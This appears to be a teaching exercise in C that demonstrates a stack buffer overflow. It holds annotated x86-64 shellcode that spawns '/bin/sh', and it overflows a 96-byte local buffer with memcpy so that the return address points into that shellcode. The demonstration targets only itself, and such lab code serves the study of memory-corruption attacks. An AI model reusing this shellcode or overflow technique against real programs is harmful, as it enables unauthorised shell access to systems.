char shellcode[] = "\x48\x31\xc0"                // xor    %rax,%rax
    "\x99"                                       // cltd
    "\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68"   // mov $0x68732f6e69622fff,%rdi
    "\xb0\x3b"                                   // mov    $0x3b,%al
    "\x48\xc1\xef\x08"                           // shr    $0x8,%rdi
    "\x57"                                       // push   %rdi
    "\x48\x89\xe7"                               // mov    %rsp,%rdi
    "\x57"                                       // push   %rdi
    "\x52"                                       // push   %rdx
    "\x48\x89\xe6"                               // mov    %rsp,%rsi
    "\x0f\x05\x90";                              // syscall

char large_string[144];
int i;

int main(void) {
    char buffer[96];
    long int *long_ptr = (long int *) large_string;
    for (i = 0; i < sizeof(large_string)/8; i++)
        *(long_ptr + i) = (long int *) buffer;
    for (i = 0; i < strlen(shellcode); i++)
        large_string[i] = shellcode[i];
    /**
        strcpy() assumes that the strings terminate the moment they encounter
        a null. The address of large_string is usually 6 bytes, so the two MSB
        are 0x0 and 0x0 which translates into null in shellcode.
        Therefore, memcpy is used instead of strcpy.
    **/
    // strcpy(buffer,large_string);
    memcpy(buffer, large_string, sizeof(large_string)/sizeof(char));
    return 0;
}
